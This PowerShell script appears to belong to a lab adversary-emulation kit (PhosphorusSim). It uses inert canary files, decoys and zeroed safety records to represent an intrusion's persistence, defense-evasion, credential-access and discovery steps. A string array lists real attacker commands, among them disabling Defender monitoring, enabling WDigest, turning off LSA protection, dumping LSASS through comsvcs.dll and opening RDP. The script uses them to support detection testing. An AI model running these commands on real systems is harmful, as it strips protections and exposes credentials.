#Requires -Version 5.1
#Requires -RunAsAdministrator
[CmdletBinding()]param([switch]$LabConfirmed)
. "$PSScriptRoot\PhosphorusSim-utilities.ps1"
Assert-PhosphorusSimSafety -LabConfirmed:$LabConfirmed
$paths = Initialize-PhosphorusSimEnvironment

Write-PhosphorusSimFile (Join-Path $paths.Temp 'Wininet.xml') '<!-- INERT SCHEDULED-TASK XML-NAME CANARY. Not registered. -->' 'task XML canary'
Write-PhosphorusSimFile (Join-Path $paths.Temp 'Wininet.bat') '@rem INERT LOOP-BATCH-NAME CANARY. Never executed.' 'batch canary'
$userTool = Join-Path $paths.Payloads 'user.exe'
New-PhosphorusSimDecoy $userTool 'DefaultAccount utility stand-in' '7b5fbbd90eab5bee6f3c25aa3c2762104e219f96501ad6a4463e25e6001eb00b'
$taskUpdate = Join-Path $paths.Payloads 'task_update.exe'
New-PhosphorusSimDecoy $taskUpdate 'task update utility stand-in' '12c6da07da24edba13650cd324b2ad04d0a0526bb4e853dee03c094075ff6d1a'
Invoke-PhosphorusSimDecoy $taskUpdate 'task_update.exe (published executable artifact)' 'aspx_wkggiyvttmu.aspx'

$reportedCommands = @(
    'schtasks /Create /TN "\Microsoft\Windows\Maintenance\Wininet" /XML C:\Windows\Temp\Wininet.xml; schtasks /Run /TN "\Microsoft\Windows\Maintenance\Wininet"',
    'Set-MpPreference -DisableBehaviorMonitoring $true; Set-MpPreference -DisableRealtimeMonitoring $true; Add-MpPreference -ExclusionPath C:\Windows',
    'activate DefaultAccount; change its password; add it to Administrators and Remote Desktop Users',
    'netsh advfirewall firewall add rule name="Terminal Server" dir=in action=allow protocol=TCP localport=3389; net start TermService',
    'reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f',
    'reg add HKLM\SYSTEM\CurrentControlSet\Control\LSA /v RunAsPPL /t REG_DWORD /d 0 /f',
    'rundll32 C:\Windows\System32\comsvcs.dll, MiniDump <lsass-pid> C:\Windows\Temp\ssasl.pmd full; Compress-Archive C:\Windows\Temp\ssasl.pmd C:\Windows\Temp\ssasl.zip',
    'net user; ipconfig /all; quser; Get-WMIObject Win32_NTDomain | findstr DomainController',
    'Get-Recipient | Select Name -ExpandProperty EmailAddresses -first 1 | Select SmtpAddress'
)
foreach ($command in $reportedCommands) { Invoke-PhosphorusSimDecoy $userTool $command 'aspx_wkggiyvttmu.aspx' }

Write-PhosphorusSimFile (Join-Path $paths.Temp 'ssasl.pmd') 'GENERATED LSASS-DUMP-NAME CANARY. Contains no process memory, credentials, or secrets.' 'credential-access canary'
Write-PhosphorusSimFile (Join-Path $paths.Temp 'ssasl.zip') 'GENERATED ARCHIVE-NAME CANARY. Not a ZIP archive and contains no collected data.' 'exfiltration canary'
Write-PhosphorusSimFile (Join-Path $paths.Evidence 'persistence-credential-negative-record.json') (@{
    scheduledTasksCreated = 0
    accountsActivatedOrCreated = 0
    passwordsChanged = 0
    groupMembershipsChanged = 0
    securityControlsChanged = 0
    firewallRulesChanged = 0
    servicesChanged = 0
    registryValuesChanged = 0
    LSASSAccessed = $false
    credentialsCollected = 0
    mailboxesAccessed = 0
    archivesCreated = 0
    exfiltratedBytes = 0
} | ConvertTo-Json) 'phase safety record'
Add-PhosphorusSimTimeline 0.04 'persistence' 'Wininet SYSTEM task, batch loop, and DefaultAccount changes represented' @{ tasksCreated = 0; accountChanges = 0 }
Add-PhosphorusSimTimeline 0.06 'defense-evasion' 'Defender, RDP firewall/service, WDigest, and LSA protection changes represented' @{ systemChanges = 0 }
Add-PhosphorusSimTimeline 0.08 'credential-access' 'LSASS MiniDump, archive, and web-shell exfiltration represented with generated canaries' @{ LSASSAccessed = $false; archivesCreated = 0; exfiltratedBytes = 0 }
Add-PhosphorusSimTimeline 0.1 'discovery' 'Local user, network, session, domain-controller, and Exchange-recipient discovery represented' @{ systemQueriesExecuted = 0; mailboxesAccessed = 0 }
